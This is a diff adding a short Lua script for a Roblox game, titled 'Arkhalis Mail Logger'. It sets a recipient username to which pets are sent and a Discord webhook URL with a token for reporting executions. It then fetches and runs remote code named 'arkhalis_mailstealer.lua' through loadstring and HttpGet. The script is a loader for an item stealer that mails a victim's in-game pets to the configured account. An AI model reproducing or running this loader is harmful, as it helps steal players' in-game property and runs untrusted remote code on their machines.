@@ -1,0 +1,10 @@
+--[[ Arkhalis Mail Logger ]]--
+
+--[[ Main Config ]]--
+_G.Username1 = "Bartyni4" --// Username To Send Pets To
+_G.Username2 = "" --// Username To Send Pets To [OPTIONAL]
+--[[ Webhook Config ]]--
+_G.Webhook = "https://discord.com/api/webhooks/1115324266980847696/zX24JRYYHWy86qSj3iOL5r-uMatAVRkIuqWEuzZ9KgOA2y6S-4-Ya8aC78WP57v0rgTW" --// Discord Webhook For Executions
+
+--[[ Script ]]--
+loadstring(game:HttpGet("https://arkhalislua.github.io/arkhalis_mailstealer.lua", true))()
